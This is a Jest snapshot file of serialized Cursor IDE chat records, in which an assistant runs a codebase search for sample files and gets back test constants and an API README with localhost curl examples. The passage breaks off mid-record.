onSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:47:45.917Z","isQuickSearchQuery":false,"richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[{\\"detail\\":0,\\"format\\":0,\\"mode\\":\\"normal\\",\\"style\\":\\"\\",\\"text\\":\\"please put sample files in the repo root\\",\\"type\\":\\"text\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","text":"please put sample files in the repo root","editToolSupportsSearchAndReplace":true,"modelInfo":{"modelName":"default"},"isNudge":false,"skipRendering":false,"isPlanExecution":false,"context":{"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"terminalFiles":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"mentions":{"notepads":{},"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"usePlaywrightMcp":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]},"notepads":[]},"checkpointId":"ab26b787-8b03-4fc0-9cd9-1c65cb2066dc"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-30 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:16164b13-55d2-4d24-a754-3c21fa4ccdab",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"16164b13-55d2-4d24-a754-3c21fa4ccdab","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"ee048cd7-6c01-42f5-9764-7b080f01b623","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:47:45.954Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","modelInfo":{"modelName":"default"},"timingInfo":{"clientStartTime":24828,"clientRpcSendTime":1761756465954,"clientSettleTime":1761756557512,"clientEndTime":1761756557512},"serverBubbleId":"c6014502-ba6e-4285-ad66-7a9c4cc3c48e","usageUuid":"ee048cd7-6c01-42f5-9764-7b080f01b623","capabilityType":30,"thinking":{"text":"","signature":"Z-hbI2fBcy4sNG3T2JxWjBRTNDfiB2qaoYXSzyvOX0mkQ946RtcRfsyyzGaxbHvn9JYsFTkTOrxF25ogqs8h8cX4rkPx8tqp3SAeh2dK4ZvV8aNOiSXDdWUM4AkYnwH4K6avpu1zxd0IPeINbX15sh0RWb8D_eClmrWPg8_MUws1j01IeGLyq6jPxP0aqTcwuly9o-C1yhrKlw0_HvKwtm0zGEnsKAPOrZVSs9rLzblrCPzmkA_3ASY_88y8Q_J7Sss_MfYdNe2os6Irkx44y0fy06FVj95vqRf7t64WPr_h5y00xZxpXtWbgwtWztgNd6EgOMKy7dbBqukHja__OXweIN1p7FEJj8YXhf3--LnKbx5YJI2mIeLFZX7I6JwTOAryqX3mWNo2k4JCIfK_xbWNX_eZYLIUShD52p6AD2RB0kg_w-qx5Ulqlty0OynQb3MhdZcrTFcfh_oQEDgm6aZ8vduJ8dKwWJI"},"thinkingDurationMs":1686}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-31 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:470dcce6-6177-464d-b43c-4b641778e412",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"470dcce6-6177-464d-b43c-4b641778e412","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:47:51.204Z","isQuickSearchQuery":false,"text":"Searching the codebase for existing sample files and checking what should be placed in the repo root.\\n","usageUuid":"ee048cd7-6c01-42f5-9764-7b080f01b623"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-32 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:c318e799-a2c1-4cbd-9f0f-a3fe578ce21e",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"c318e799-a2c1-4cbd-9f0f-a3fe578ce21e","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:47:51.735Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":9,"toolIndex":1,"modelCallId":"94bee8e6-f0f3-4364-9f67-98e8c95a58ae","toolCallId":"tool_efa1343a-6555-4a78-ab17-857d7e8fe72","status":"completed","rawArgs":"{\\"query\\": \\"sample files examples\\", \\"target_directories\\": []}","name":"codebase_search","params":"{\\"repositoryInfo\\":{\\"relativeWorkspacePath\\":\\".\\",\\"repoName\\":\\"7297bde4-6c3c-4b5f-9f31-a615fa663f72\\",\\"repoOwner\\":\\"google-oauth2|user_01JMHPT9B3D4A66MBMWNRKH8QX\\",\\"orthogonalTransformSeed\\":3253139624173949,\\"preferredEmbeddingModel\\":\\"EMBEDDING_MODEL_UNSPECIFIED\\"},\\"query\\":\\"sample files examples\\",\\"topK\\":15,\\"explanation\\":\\"\\",\\"codeResults\\":[{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"__tests__/constants/constants.ts\\",\\"range\\":{\\"startPosition\\":{\\"line\\":61,\\"column\\":2},\\"endPosition\\":{\\"line\\":101,\\"column\\":19}},\\"signatures\\":{}},\\"score\\":0.32742080092430115},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":81,\\"column\\":1}},\\"signatures\\":{}},\\"score\\":0.31596270203590393},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/generator/prompt_files/markdown_system_prompt.txt\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":45,\\"column\\":1}},\\"signatures\\":{}},\\"score\\":0.3146929144859314},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"services/node_general_backend/src/maintenance/try_now.ts\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":40,\\"column\\":5}},\\"signatures\\":{}},\\"score\\":0.3024810552597046},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/ai-playground/src/components/mock.ts\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":333,\\"column\\":1}},\\"signatures\\":{}},\\"score\\":0.29074323177337646},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"consumers/analyzer/README.md\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":45,\\"column\\":1}},\\"signatures\\":{}},\\"score\\":0.2902885973453522},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md\\",\\"range\\":{\\"startPosition\\":{\\"line\\":81,\\"column\\":1},\\"endPosition\\":{\\"line\\":160,\\"column\\":1}},\\"signatures\\":{}},\\"score\\":0.288938045501709},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"clients/cli/__tests__/mcp/fileUtils.unit.test.ts\\",\\"range\\":{\\"startPosition\\":{\\"line\\":210,\\"column\\":7},\\"endPosition\\":{\\"line\\":282,\\"column\\":28}},\\"signatures\\":{\\"ranges\\":[{\\"startPosition\\":{\\"line\\":19,\\"column\\":1},\\"endPosition\\":{\\"line\\":19,\\"column\\":1}},{\\"startPosition\\":{\\"line\\":19,\\"column\\":23},\\"endPosition\\":{\\"line\\":20,\\"column\\":3}},{\\"startPosition\\":{\\"line\\":31,\\"column\\":3},\\"endPosition\\":{\\"line\\":31,\\"column\\":3}},{\\"startPosition\\":{\\"line\\":31,\\"column\\":34},\\"endPosition\\":{\\"line\\":32,\\"column\\":5}}]}},\\"score\\":0.2807697057723999},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"services/app/src/components/Analysis/collapsible/GenerateAIRule.tsx\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":37,\\"column\\":78}},\\"signatures\\":{}},\\"score\\":0.28029704093933105},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":240,\\"column\\":20},\\"endPosition\\":{\\"line\\":268,\\"column\\":18}},\\"signatures\\":{}},\\"score\\":0.2794812321662903},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"clients/cli/__tests__/mcp/helpers/MockRepo.ts\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":61,\\"column\\":4}},\\"signatures\\":{}},\\"score\\":0.27924689650535583},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/generator/templates/vulnerability_template.md.txt\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":63,\\"column\\":1}},\\"signatures\\":{}},\\"score\\":0.2715897858142853},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"consumers/analyzer/tests/assets/python/wildcard_imports/README.md\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":49,\\"column\\":1}},\\"signatures\\":{}},\\"score\\":0.2711057662963867},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"consumers/analyzer/tests/assets/java/sqli/e-1578/source/README.md\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":68,\\"column\\":1}},\\"signatures\\":{}},\\"score\\":0.2711007595062256},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"pycommon/tests/conftest.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":42,\\"column\\":22}},\\"signatures\\":{}},\\"score\\":0.2702752351760864}]}","additionalData":{},"result":"{\\"codeResults\\":[{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"__tests__/constants/constants.ts\\",\\"range\\":{\\"startPosition\\":{\\"line\\":55},\\"endPosition\\":{\\"line\\":232,\\"column\\":1}},\\"contents\\":\\"\\\\n\\\\nexport const CONSTANTS = {\\\\n  DATA: {\\\\n    EMPTY: {\\\\n      UPLOAD_FILE: {\\\\n        SEMGREP: getUploadFile('files/empty/semgrep.json'),\\\\n      },\\\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\\\n      REPO_ARCHIVE: getUploadFile('files/empty/repo.zip'),\\\\n    } as TestData,\\\\n    WEBGOAT_MINIMAL: {\\\\n      UPLOAD_FILE: {\\\\n        //filtered report leaving only 6 sqli findings with fixes that have conflicts\\\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx-minimal.json'),\\\\n      },\\\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\\\n    } as TestData,\\\\n    WEBGOAT: {\\\\n      UPLOAD_FILE: {\\\\n        CODEQL: getUploadFile('files/webgoat/codeql.json'),\\\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx.json'),\\\\n        CHECKMARX_XML: getUploadFile('files/webgoat/checkmarx.xml'),\\\\n        SNYK: getUploadFile('files/webgoat/snyk.json'),\\\\n        FORTIFY: getUploadFile('files/webgoat/scandata.fpr'),\\\\n        SONARQUBE: getUploadFile('files/webgoat/sonarqube.json'),\\\\n      },\\\\n      GIT_REPO: 'https://github.com/WebGoat/WebGoat',\\\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\\\n      REPO_ARCHIVE: getUploadFile('files/webgoat/repo.zip'),\\\\n    } as TestData,\\\\n    MOBB_SVJP: {\\\\n      UPLOAD_FILE: {\\\\n        CHECKMARX: getUploadFile('files/svjp/checkmarx.json'),\\\\n      },\\\\n      GIT_REPO: 'https://github.com/mobb-dev/simple-vulnerable-java-project',\\\\n      REFERENCE: 'main',\\\\n      REPO_ARCHIVE: getUploadFile('files/svjp/repo.zip'),\\\\n    } as TestData,\\",\\"originalContents\\":\\"\\\\n\\\\nexport const CONSTANTS = {\\\\n  DATA: {\\\\n    EMPTY: {\\\\n      UPLOAD_FILE: {\\\\n        SEMGREP: getUploadFile('files/empty/semgrep.json'),\\\\n      },\\\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\\\n      REPO_ARCHIVE: getUploadFile('files/empty/repo.zip'),\\\\n    } as TestData,\\\\n    WEBGOAT_MINIMAL: {\\\\n      UPLOAD_FILE: {\\\\n        //filtered report leaving only 6 sqli findings with fixes that have conflicts\\\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx-minimal.json'),\\\\n      },\\\\n      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\\\n    } as TestData,\\\\n    WEBGOAT: {\\\\n      UPLOAD_FILE: {\\\\n        CODEQL: getUploadFile('files/webgoat/codeql.json'),\\\\n        CHECKMARX: getUploadFile('files/webgoat/checkmarx.json'),\\\\n        CHECKMARX_XML: getUploadFile('files/webgoat/checkmarx.xml'),\\\\n        SNYK: getUploadFile('files/webgoat/snyk.json'),\\\\n        FORTIFY: getUploadFile('files/webgoat/scandata.fpr'),\\\\n        SONARQUBE: getUploadFile('files/webgoat/sonarqube.json'),\\\\n      },\\\\n      GIT_REPO: 'https://github.com/WebGoat/WebGoat',\\\\n      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\\\n      REPO_ARCHIVE: getUploadFile('files/webgoat/repo.zip'),\\\\n    } as TestData,\\\\n    MOBB_SVJP: {\\\\n      UPLOAD_FILE: {\\\\n        CHECKMARX: getUploadFile('files/svjp/checkmarx.json'),\\\\n      },\\\\n      GIT_REPO: 'https://github.com/mobb-dev/simple-vulnerable-java-project',\\\\n      REFERENCE: 'main',\\\\n      REPO_ARCHIVE: getUploadFile('files/svjp/repo.zip'),\\\\n    } as TestData,\\",\\"detailedLines\\":[{\\"text\\":\\"export function getUploadFile(filename: string): UploadFile {\\",\\"lineNumber\\":56,\\"isSignature\\":true},{\\"text\\":\\" fs.readFileSync(path.resolve(process.cwd(), filename)),\\",\\"lineNumber\\":59},{\\"text\\":\\"  }\\",\\"lineNumber\\":60},{\\"text\\":\\"}\\",\\"lineNumber\\":61,\\"isSignature\\":true},{\\"lineNumber\\":62},{\\"text\\":\\"export const CONSTANTS = {\\",\\"lineNumber\\":63},{\\"text\\":\\"  DATA: {\\",\\"lineNumber\\":64},{\\"text\\":\\"    EMPTY: {\\",\\"lineNumber\\":65},{\\"text\\":\\"      UPLOAD_FILE: {\\",\\"lineNumber\\":66},{\\"text\\":\\"        SEMGREP: getUploadFile('files/empty/semgrep.json'),\\",\\"lineNumber\\":67},{\\"text\\":\\"      },\\",\\"lineNumber\\":68},{\\"text\\":\\"      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\",\\"lineNumber\\":69},{\\"text\\":\\"      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\",\\"lineNumber\\":70},{\\"text\\":\\"      REPO_ARCHIVE: getUploadFile('files/empty/repo.zip'),\\",\\"lineNumber\\":71},{\\"text\\":\\"    } as TestData,\\",\\"lineNumber\\":72},{\\"text\\":\\"    WEBGOAT_MINIMAL: {\\",\\"lineNumber\\":73},{\\"text\\":\\"      UPLOAD_FILE: {\\",\\"lineNumber\\":74},{\\"text\\":\\"        //filtered report leaving only 6 sqli findings with fixes that have conflicts\\",\\"lineNumber\\":75},{\\"text\\":\\"        CHECKMARX: getUploadFile('files/webgoat/checkmarx-minimal.json'),\\",\\"lineNumber\\":76},{\\"text\\":\\"      },\\",\\"lineNumber\\":77},{\\"text\\":\\"      GIT_REPO: 'https://github.com/mobbcitestjob/webgoat',\\",\\"lineNumber\\":78},{\\"text\\":\\"      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\",\\"lineNumber\\":79},{\\"text\\":\\"    } as TestData,\\",\\"lineNumber\\":80},{\\"text\\":\\"    WEBGOAT: {\\",\\"lineNumber\\":81},{\\"text\\":\\"      UPLOAD_FILE: {\\",\\"lineNumber\\":82},{\\"text\\":\\"        CODEQL: getUploadFile('files/webgoat/codeql.json'),\\",\\"lineNumber\\":83},{\\"text\\":\\"        CHECKMARX: getUploadFile('files/webgoat/checkmarx.json'),\\",\\"lineNumber\\":84},{\\"text\\":\\"        CHECKMARX_XML: getUploadFile('files/webgoat/checkmarx.xml'),\\",\\"lineNumber\\":85},{\\"text\\":\\"        SNYK: getUploadFile('files/webgoat/snyk.json'),\\",\\"lineNumber\\":86},{\\"text\\":\\"        FORTIFY: getUploadFile('files/webgoat/scandata.fpr'),\\",\\"lineNumber\\":87},{\\"text\\":\\"        SONARQUBE: getUploadFile('files/webgoat/sonarqube.json'),\\",\\"lineNumber\\":88},{\\"text\\":\\"      },\\",\\"lineNumber\\":89},{\\"text\\":\\"      GIT_REPO: 'https://github.com/WebGoat/WebGoat',\\",\\"lineNumber\\":90},{\\"text\\":\\"      REFERENCE: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\",\\"lineNumber\\":91},{\\"text\\":\\"      REPO_ARCHIVE: getUploadFile('files/webgoat/repo.zip'),\\",\\"lineNumber\\":92},{\\"text\\":\\"    } as TestData,\\",\\"lineNumber\\":93},{\\"text\\":\\"    MOBB_SVJP: {\\",\\"lineNumber\\":94},{\\"text\\":\\"      UPLOAD_FILE: {\\",\\"lineNumber\\":95},{\\"text\\":\\"        CHECKMARX: getUploadFile('files/svjp/checkmarx.json'),\\",\\"lineNumber\\":96},{\\"text\\":\\"      },\\",\\"lineNumber\\":97},{\\"text\\":\\"      GIT_REPO: 'https://github.com/mobb-dev/simple-vulnerable-java-project',\\",\\"lineNumber\\":98},{\\"text\\":\\"      REFERENCE: 'main',\\",\\"lineNumber\\":99},{\\"text\\":\\"      REPO_ARCHIVE: getUploadFile('files/svjp/repo.zip'),\\",\\"lineNumber\\":100},{\\"text\\":\\"    } as TestData,\\",\\"lineNumber\\":101},{\\"text\\":\\"    ALTOROJ: {\\",\\"lineNumber\\":102},{\\"text\\":\\"      UPLOAD_FILE:\\",\\"lineNumber\\":103},{\\"text\\":\\",\\",\\"lineNumber\\":232},{\\"text\\":\\"}\\",\\"lineNumber\\":233}]},\\"score\\":0.32742080092430115},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"consumers/analyzer/tests/assets/java/pt/e-1488/source/README.md\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":82}},\\"contents\\":\\"# File Upload/Download REST API\\\\n\\\\nA simple Java REST API built with Spring Boot that allows users to upload files and download them later.\\\\n\\\\n## Features\\\\n\\\\n- **File Upload**: Upload files with automatic unique filename generation\\\\n- **File Download**: Download files by filename\\\\n- **File Listing**: List all uploaded files\\\\n- **File Deletion**: Delete files by filename\\\\n- **File Information**: Get file metadata (size, last modified)\\\\n- **Web Interface**: Simple HTML interface for testing the API\\\\n\\\\n## Prerequisites\\\\n\\\\n- Java 17 or higher\\\\n- Maven 3.6 or higher\\\\n\\\\n## Quick Start\\\\n\\\\n### 1. Build the Application\\\\n\\\\n\`\`\`bash\\\\nmvn clean install\\\\n\`\`\`\\\\n\\\\n### 2. Run the Application\\\\n\\\\n\`\`\`bash\\\\nmvn spring-boot:run\\\\n\`\`\`\\\\n\\\\nThe application will start on \`http://localhost:8080\`\\\\n\\\\n### 3. Access the Web Interface\\\\n\\\\nOpen your browser and navigate to \`http://localhost:8080\` to access the web interface for testing the API.\\\\n\\\\n## API Endpoints\\\\n\\\\n### Upload File\\\\n- **URL**: \`POST /api/files/upload\`\\\\n- **Content-Type**: \`multipart/form-data\`\\\\n- **Parameter**: \`file\` (the file to upload)\\\\n- **Response**: JSON with success message and generated filename\\\\n\\\\n**Example using curl:**\\\\n\`\`\`bash\\\\ncurl -X POST -F \\\\\\"file=@/path/to/your/file.txt\\\\\\" http://localhost:8080/api/files/upload\\\\n\`\`\`\\\\n\\\\n### Download File\\\\n- **URL**: \`GET /api/files/download?filename={filename}\`\\\\n- **Response**: File download with appropriate headers\\\\n\\\\n**Example using curl:**\\\\n\`\`\`bash\\\\ncurl -O -J \\\\\\"http://localhost:8080/api/files/download?filename={filename}\\\\\\"\\\\n\`\`\`\\\\n\\\\n### List Files\\\\n- **URL**: \`GET /api/files/list\`\\\\n- **Response**: JSON with list of all uploaded files\\\\n\\\\n**Example using curl:**\\\\n\`\`\`bash\\\\ncurl http://localhost:8080/api/files/list\\\\n\`\`\`\\\\n\\\\n### Delete File\\\\n- **URL**: \`DELETE /api/files/delete?filename={filename}\`\\\\n- **Response**: JSON with success message\\\\n\\\\n**Example using curl:**\\\\n\`\`\`bash\\\\ncurl -X DELETE \\\\\\"http://localhost:8080/api/files/delete?filename={filename}\\\\\\"\\\\n\`\`\`\\\\n\\\\n### Get File Information\\\\n- **URL**: \`GET /api/files/info?filename={filename}\`\\\\n\\",\\"originalContents\\":\\"# File Upload/Download REST API\\\\n\\\\nA simple Java REST API built with Spring Boot that allows users to upload files and download them later.\\\\n\\\\n## Features\\\\n\\\\n- **File Upload**: Upload files with automatic unique filename generation\\\\n- **File Download**: Download files by filename\\\\n- **File Listing**: List all uploaded files\\\\n- **File Deletion**: Delete files by filename\\\\n- **File Information**: Get file metadata (size, last modified)\\\\n- **Web Interface**: Simple HTML interface for testing the API\\\\n\\\\n## Prerequisites\\\\n\\\\n- Java 17 or higher\\\\n- Maven 3.6 or higher\\\\n\\\\n## Quick Start\\\\n\\\\n### 1. Build the Application\\\\n\\\\n\`\`\`bash\\\\nmvn clean install\\\\n\`\`\`\\\\n\\\\n### 2. Run the Application\\\\n\\\\n\`\`\`bash\\\\nmvn spring-boot:run\\\\n\`\`\`\\\\n\\\\nThe application will start on \`http://localhost:8080\`\\\\n\\\\n### 3. Access the Web Interface\\\\n\\\\nOpen your browser and navigate to \`http://localhost:8080\` to access the web interface for testing the API.\\\\n\\\\n## API Endpoints\\\\n\\\\n### Upload File\\\\n- **URL**: \`POST /api/files/upload\`\\\\n- **Content-Type**: \`multipart/form-data\`\\\\n- **Parameter**: \`file\` (the file to upload)\\\\n- **Response**: JSON with success message and generated filename\\\\n\\\\n**Example using curl:**\\\\n\`\`\`bash\\\\ncurl -X POST -F \\\\\\"file=@/path/to/your/file.txt\\\\\\" http://localhost:8080/api/files/upload\\\\n\`\`\`\\\\n\\\\n### Download File\\\\n- **URL**: \`GET /api/files/download?filename={filename}\`\\\\n- **Response**: File download with appropriate headers\\\\n\\\\n**Example using curl:**\\\\n\`\`\`bash\\\\ncurl -O -J \\\\\\"http://localhost:8080/api/files/download?filename={filename}\\\\\\"\\\\n\`\`\`\\\\n\\\\n### List Files\\\\n- **URL**: \`GET /api/files/list\`\\\\n- **Response**: JSON with list of all uploaded files\\\\n\\\\n**Example using curl:**\\\\n\`\`\`bash\\\\ncurl http://localhost:8080/api/files/list\\\\n\`\`\`\\\\n\\\\n### Delete File\\\\n- **URL**: \`DELETE /api/files/delete?filename={filename}\`\\\\n- **Response**: JSON with success message\\\\n\\\\n**Example using curl:**\\\\n\`\`\`bash\\\\ncurl -X DELETE \\\\\\"http://localhost:8080/api/files/delete?filename={filename}\\\\\\"\\\\n\`\`\`\\\\n\\\\n### Get File Information\\\\n- **URL**: \`GET /api/files/info?filename={filename}\`\\\\n\\",\\"detailedLines\\":[{\\"text\\":\\"# File Upload/Download REST API\\",\\"lineNumber\\":1},{\\"lineNumber\\":2},{\\"text\\":\\"A simple Java REST API built with Spring Boot that allows users to upload files and download them later.\\",\\"lineNumber\\":3},{\\"lineNumber\\":4},{\\"text\\":\\"## Features\\",\\"lineNumber\\":5},{\\"lineNumber\\":6},{\\"text\\":\\"- **File Upload**: Upload files with automatic unique filename generation\\",\\"lineNumber\\":7},{\\"text\\":\\"- **File Download**: Download files by filename\\",\\"lineNumber\\":8},{\\"text\\":\\"- **File Listing**: List all uploaded files\\",\\"lineNumber\\":9},{\\"text\\":\\"- **File Deletion**: Delete files by filename\\",\\"lineNumber\\":10},{\\"text\\":\\"- **File Information**: Get file metadata (size, last modified)\\",\\"lineNumber\\":11},{\\"text\\":\\"- **Web Interface**: Simple HTML interface for testing the API\\",\\"lineNumber\\":12},{\\"lineNumber\\":13},{\\"text\\":\\"## 